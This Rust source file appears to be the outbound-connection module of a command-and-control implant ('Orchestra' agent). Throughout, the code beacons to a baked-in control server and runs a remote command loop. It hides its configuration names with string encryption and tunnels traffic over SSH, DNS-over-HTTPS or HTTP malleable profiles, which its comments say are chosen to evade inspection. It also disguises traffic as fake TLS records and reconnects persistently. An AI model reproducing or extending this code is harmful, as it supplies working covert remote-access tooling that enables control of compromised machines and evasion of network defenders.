//! Outbound connection mode — compiled only when `outbound-c` feature is active.
//!
//! The agent dials the Orchestra Control Center (instead of waiting for an
//! inbound connection from a console) and maintains a persistent session with
//! exponential-backoff reconnection.
//!
//! # Address resolution
//!
//! Release builds use `ORCHESTRA_C_ADDR` baked into the binary at compile time
//! via the Builder's `cargo build … ORCHESTRA_C_ADDR=<addr>` invocation and
//! prioritize that value, but fall back to the `ORCHESTRA_C` runtime
//! environment variable if the baked constant is absent. Debug builds instead
//! prioritize the runtime environment variable to simplify local testing.
//!
//! # Secret resolution
//!
//! Release builds use `ORCHESTRA_C_SECRET` baked in at compile time and
//! prioritize it, but fall back to the `ORCHESTRA_SECRET` runtime environment
//! variable if the baked constant is absent. Debug builds instead prioritize
//! the runtime environment variable for local testing.
//!
//! # TLS verification
//!
//! When `ORCHESTRA_C_CERT_FP` is baked in at build time the agent pins the
//! server certificate by its SHA-256 fingerprint (hex).  Without a fingerprint
//! the agent uses the system's native root CA store, which works for servers
//! with publicly-trusted certificates.  Production deployments should always
//! use certificate pinning.

use anyhow::{anyhow, Result};
use common::normalized_transport::{NormalizedTransport, Role, TrafficProfile};
use common::tls_transport::{PinnedCertVerifier, TlsTransport};
// CryptoSession is used by the TLS fallback path (when forward-secrecy is off)
// and by the DoH/HTTP covert transports.  When forward-secrecy is on AND no
// covert transport feature is compiled in, the import is unused, so guard it.
#[cfg(any(
    not(feature = "forward-secrecy"),
    feature = "doh-transport",
    feature = "http-transport",
    feature = "ssh-transport"
))]
use common::CryptoSession;
use common::{Message, Transport};
use log::{error, info, warn};
use rustls::ClientConfig;
use std::sync::Arc;
use sysinfo::System;
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use tokio_rustls::TlsConnector;
use uuid::Uuid;

// Compile-time constants injected by the Builder (may be absent in manual builds).
const BAKED_ADDR: Option<&str> = option_env!("ORCHESTRA_C_ADDR");
const BAKED_SECRET: Option<&str> = option_env!("ORCHESTRA_C_SECRET");
const BAKED_CERT_FP: Option<&str> = option_env!("ORCHESTRA_C_CERT_FP");
/// Path to the PEM client certificate presented to the server during mTLS.
const BAKED_MTLS_CERT: Option<&str> = option_env!("ORCHESTRA_C_MTLS_CERT");
/// Path to the PEM private key for the mTLS client certificate.
const BAKED_MTLS_KEY: Option<&str> = option_env!("ORCHESTRA_C_MTLS_KEY");

const MAX_BACKOFF_SECS: u64 = 64;

/// Resolve the server address.
///
/// Debug builds: runtime env var takes precedence over baked constant.
/// Release builds: baked constant takes precedence, env var is fallback.
pub fn resolve_addr() -> Option<String> {
    // Always try the encrypted env var key first.
    let env_val = {
        let raw = string_crypt::enc_str!("ORCHESTRA_C");
        let key = std::str::from_utf8(&raw)
            .unwrap_or("")
            .trim_end_matches('\0');
        std::env::var(key).ok()
    };

    if cfg!(debug_assertions) {
        env_val.or_else(|| BAKED_ADDR.map(str::to_string))
    } else {
        BAKED_ADDR.map(str::to_string).or(env_val)
    }
}

/// Resolve the pre-shared secret.
///
/// Debug builds: runtime env var takes precedence over baked constant.
/// Release builds: baked constant takes precedence, env var is fallback.
pub fn resolve_secret() -> Option<String> {
    // Always try the encrypted env var key first.
    let env_val = {
        let raw = string_crypt::enc_str!("ORCHESTRA_SECRET");
        let key = std::str::from_utf8(&raw)
            .unwrap_or("")
            .trim_end_matches('\0');
        std::env::var(key).ok()
    };

    if cfg!(debug_assertions) {
        env_val.or_else(|| BAKED_SECRET.map(str::to_string))
    } else {
        BAKED_SECRET.map(str::to_string).or(env_val)
    }
}

/// Resolve the TLS certificate fingerprint (hex SHA-256).
pub fn resolve_cert_fp() -> Option<String> {
    BAKED_CERT_FP.map(str::to_string)
}

/// Build a rustls `ClientConfig` for connecting to the Control Center.
///
/// When `cert_fp` is provided the server certificate is verified by its
/// SHA-256 fingerprint (strict pinning).  Otherwise the system's native root
/// CA store is used.
///
/// When `mtls_cert_path` and `mtls_key_path` are both provided the client
/// presents its own certificate during the TLS handshake, enabling mTLS.
/// This is backward compatible: if neither path is set the client connects
/// without a client certificate (standard TLS).
fn build_tls_client_config(
    cert_fp: Option<&str>,
    mtls_cert_path: Option<&str>,
    mtls_key_path: Option<&str>,
) -> Result<ClientConfig> {
    // ── Server certificate verification ──────────────────────────────────
    let builder = if let Some(fp) = cert_fp {
        let verifier = PinnedCertVerifier::from_hex(fp)?;
        ClientConfig::builder()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(verifier))
    } else {
        // No fingerprint — fall back to native root store.
        let mut roots = rustls::RootCertStore::empty();
        let native = rustls_native_certs::load_native_certs();
        if !native.errors.is_empty() {
            warn!(
                "outbound-c: {} errors loading native root certs (continuing)",
                native.errors.len()
            );
        }
        for cert in native.certs {
            roots.add(cert).ok();
        }
        ClientConfig::builder().with_root_certificates(roots)
    };

    // ── Client certificate (mTLS) ─────────────────────────────────────────
    if let (Some(cert_path), Some(key_path)) = (mtls_cert_path, mtls_key_path) {
        use rustls::pki_types::{CertificateDer, PrivateKeyDer};

        let cert_bytes = std::fs::read(cert_path)
            .map_err(|e| anyhow!("reading mTLS client cert {cert_path}: {e}"))?;
        let key_bytes = std::fs::read(key_path)
            .map_err(|e| anyhow!("reading mTLS client key {key_path}: {e}"))?;

        let certs: Vec<CertificateDer<'static>> =
            rustls_pemfile::certs(&mut cert_bytes.as_slice())
                .collect::<std::result::Result<Vec<_>, _>>
                ()
                .map_err(|e| anyhow!("parsing mTLS client cert {cert_path}: {e}"))?;

        let key: PrivateKeyDer<'static> =
            rustls_pemfile::private_key(&mut key_bytes.as_slice())
                .map_err(|e| anyhow!("parsing mTLS client key {key_path}: {e}"))?
                .ok_or_else(|| anyhow!("no private key found in {key_path}"))?;

        info!("outbound-c: mTLS client certificate configured ({})", cert_path);
        return builder
            .with_client_auth_cert(certs, key)
            .map_err(|e| anyhow!("configuring mTLS client cert: {e}"));
    }

    Ok(builder.with_no_client_auth())
}

/// Build the appropriate outbound transport based on compiled features and the
/// runtime malleable-profile configuration.
///
/// Priority order:
///   1. SSH transport  (`ssh-transport`  feature + `ssh_host` configured)
///   2. DoH transport  (`doh-transport`  feature + `dns_over_https = true`)
///   3. HTTP transport (`http-transport` feature + `cdn_relay = true`)
///   4. Direct TLS connection (always-available fallback)
///
/// Extracting this logic out of [`connect_once`] makes the transport selection
/// reusable: any startup path (outbound-c, future inbound mode, tests) can
/// call this function rather than duplicating the config-reading and feature
/// gating.
pub async fn build_outbound_transport(
    addr: &str,
    secret: &str,
    cert_fp: Option<&str>,
    _agent_id: &str,
) -> Result<Box<dyn Transport + Send>> {
    // Load config once; shared by the covert-transport selection block below
    // and the traffic_profile assignment in the TLS fallback path.
    let config_result = crate::config::load_config();
    #[cfg(any(
        feature = "ssh-transport",
        feature = "doh-transport",
        feature = "http-transport"
    ))]
    {
        match config_result.as_ref() {
            Ok(cfg) => {
                // SSH transport: tunnel C2 messages through an SSH session
                // channel.  Highest priority because SSH blends in with
                // legitimate administrative traffic and is rarely DPI'd.
                // Requires ssh_host (and ssh_username + ssh_auth) in the
                // malleable profile.
                #[cfg(feature = "ssh-transport")]
                if cfg.malleable_profile.ssh_host.as_deref().filter(|s| !s.is_empty()).is_some() {
                    info!(
                        "ssh-transport: ssh_host configured ({}); switching to SshTransport",
                        cfg.malleable_profile.ssh_host.as_deref().unwrap_or("?")
                    );
                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
                    return Ok(Box::new(
                        crate::c2_ssh::SshTransport::new(&cfg.malleable_profile, session)
                            .await
                            .map_err(|e| anyhow!("SshTransport init failed: {e}"))?,
                    ));
                }

                // DoH transport: tunnel C2 messages through DNS TXT records sent
                // to a public DoH resolver.  Requires a server-side DoH-to-C2
                // bridge; the bridge URL must be set in `doh_server_url` in the
                // malleable profile — activating without it would produce a
                // transport that can never receive commands.
                #[cfg(feature = "doh-transport")]
                if cfg.malleable_profile.dns_over_https {
                    let agent_id = _agent_id;
                    let server_url = cfg
                        .malleable_profile
                        .doh_server_url
                        .as_deref()
                        .filter(|s| !s.is_empty())
                        .ok_or_else(|| anyhow!(
                            "DoH transport requires a compatible server-side DNS-to-C2 bridge \
                             which is not included. Set doh_server_url in config or disable \
                             dns_over_https."
                        ))?;
                    info!(
                        "doh-transport: dns_over_https=true, server_url={}; switching to DohTransport",
                        server_url
                    );
                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
                    return Ok(Box::new(
                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session, agent_id.to_string())
                            .await
                            .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
                    ));
                }

                // HTTP transport: tunnel C2 messages over HTTP/S using the
                // malleable profile (custom User-Agent, Host header, staging URI).
                // The Orchestra server must expose the staging URI via its reverse
                // proxy — see docs/C_SERVER.md.
                #[cfg(feature = "http-transport")]
                if cfg.malleable_profile.cdn_relay {
                    let agent_id = _agent_id;
                    info!("http-transport: cdn_relay=true; switching to HttpTransport");
                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
                    return Ok(Box::new(
                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session, agent_id.to_string())
                            .await
                            .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
                    ));
                }
            }
            Err(e) => {
                warn!(
                    "outbound-c: could not load config for transport selection: {e}; \
                     falling back to TLS transport"
                );
            }
        }
    }

    // ─── Default: direct TLS connection to Control Center ────────────────────
    info!("outbound-c: connecting to Control Center addr={addr}");

    let tcp = TcpStream::connect(addr).await?;
    tcp.set_nodelay(true)?;

    let tls_cfg = build_tls_client_config(cert_fp, BAKED_MTLS_CERT, BAKED_MTLS_KEY)?;
    let connector = TlsConnector::from(Arc::new(tls_cfg));

    let host = addr.split(':').next().unwrap_or(addr);
    let server_name = rustls::pki_types::ServerName::try_from(host.to_owned())
        .map_err(|e| anyhow!("invalid server address for TLS SNI '{host}': {e}"))?;

    let mut tls_stream = connector.connect(server_name, tcp).await?;
    info!("outbound-c: TLS handshake complete");

    #[cfg(feature = "forward-secrecy")]
    let session = common::forward_secrecy::negotiate_session_key(
        &mut tls_stream,
        secret.as_bytes(),
        true, // client sends its public key first
    )
    .await?;
    #[cfg(not(feature = "forward-secrecy"))]
    let session = CryptoSession::from_shared_secret(secret.as_bytes());

    // Wire traffic normalization profile from config (M-39 / Prompt 4-1).
    // When `traffic_profile = "tls"` the raw ciphertext is additionally wrapped
    // in fake TLS 1.2 application-data records by NormalizedTransport; the
    // real outer TLS already provides confidentiality and authentication.
    let traffic_profile = config_result
        .map(|c| c.traffic_profile)
        .unwrap_or_default();

    match traffic_profile {
        TrafficProfile::Tls => {
            info!("outbound-c: applying NormalizedTransport (traffic_profile=tls)");
            let nt = NormalizedTransport::connect(tls_stream, session, Role::Client).await?;
            Ok(Box::new(nt))
        }
        TrafficProfile::Raw => Ok(Box::new(TlsTransport::new(tls_stream, session))),
    }
}

/// Send the initial heartbeat and start the agent command loop for any transport.
async fn run_with_heartbeat(
    mut transport: Box<dyn Transport + Send>,
    agent_id: &str,
) -> Result<()> {
    // ── Protocol version handshake (M-2) ─────────────────────────────────────
    // Send our version first so the server can reject incompatible agents fast,
    // before any expensive work or state is committed on either side.
    transport
        .send(Message::VersionHandshake {
            version: common::PROTOCOL_VERSION,
        })
        .await?;

    match transport.recv().await {
        Ok(Message::VersionHandshake { version }) => {
            if version != common::PROTOCOL_VERSION {
                anyhow::bail!(
                    "protocol version mismatch: server={version}, agent={}. \
                     Rebuild the agent or update the server to the same release.",
                    common::PROTOCOL_VERSION
                );
            }
            info!(
                "outbound-c: protocol version {} accepted by server",
                version
            );
        }
        Ok(other) => {
            // Server pre-dates M-2 and sent a message other than VersionHandshake
            // (most likely a Heartbeat from an old bidirectional protocol).
            // Warn and continue — the TLS handshake + shared secret already
            // provide authentication; the missing version check is a soft degradation.
            warn!(
                "outbound-c: server did not reply with VersionHandshake (got {:?}); \
                 possible version mismatch — proceeding without version validation",
                other
            );
        }
        Err(e) => {
            anyhow::bail!(
                "version handshake failed: {e}. \
                 Likely causes: wrong shared secret, protocol version mismatch, \
                 or a network device intercepting the connection."
            );
        }
    }

    // ── Registration heartbeat ────────────────────────────────────────────────
    let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
    transport
        .send(Message::Heartbeat {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
            agent_id: agent_id.to_string(),
            status: hostname,
        })
        .await?;
    info!("outbound-c: registered with Control Center, running command loop");
    let mut agent = crate::Agent::new(transport)?;
    agent.run().await
}

/// Connect once, run the agent command loop until transport error or
/// clean shutdown. Returns `Ok(())` on a clean `Shutdown` command.
async fn connect_once(
    addr: &str,
    secret: &str,
    agent_id: &str,
    cert_fp: Option<&str>,
) -> Result<()> {
    let transport = build_outbound_transport(addr, secret, cert_fp, agent_id).await?;
    run_with_heartbeat(transport, agent_id).await
}

/// Reconnect loop with exponential back-off. Returns only on clean shutdown
/// (i.e. when the agent receives `Command::Shutdown` from the server).
pub async fn run_forever() -> Result<()> {
    let addr = resolve_addr().ok_or_else(|| {
        anyhow!(
            "No Control Center address configured. \
             Rebuild with ORCHESTRA_C_ADDR set (the Builder does this automatically). \
             Debug builds may also set ORCHESTRA_C at runtime."
        )
    })?;

    let secret = resolve_secret().ok_or_else(|| {
        anyhow!(
            "No pre-shared secret configured. \
             Rebuild with ORCHESTRA_C_SECRET set. \
             Debug builds may also set ORCHESTRA_SECRET at runtime."
        )
    })?;

    let cert_fp = resolve_cert_fp();
    if cert_fp.is_none() {
        warn!(
            "outbound-c: no TLS certificate fingerprint configured. \
             Production deployments should bake in ORCHESTRA_C_CERT_FP for strict pinning."
        );
    }

    // Generate a stable agent ID for this process lifetime so the server
    // recognises reconnects as the same agent.
    let agent_id = format!(
        "{}-{}",
        System::host_name().unwrap_or_else(|| "agent".to_string()),
        Uuid::new_v4()
    );

    let mut backoff = Duration::from_secs(1);
    loop {
        match connect_once(&addr, &secret, &agent_id, cert_fp.as_deref()).await {
            Ok(()) => {
                // Clean shutdown — respect it, do not reconnect.
                info!("outbound-c: received Shutdown from Control Center, exiting.");
                return Ok(());
            }
            Err(e) => {
                error!("outbound-c: session ended: {e:#}");
                warn!("outbound-c: reconnecting in {backoff:?}");
                // Protect sensitive memory while waiting to reconnect.
                if let Err(ge) = crate::memory_guard::guarded_sleep(backoff, None).await {
                    error!("[memory-guard] error during reconnect backoff: {ge}");
                    sleep(backoff).await;
                }
                backoff = (backoff * 2).min(Duration::from_secs(MAX_BACKOFF_SECS));
            }
        }
    }
}
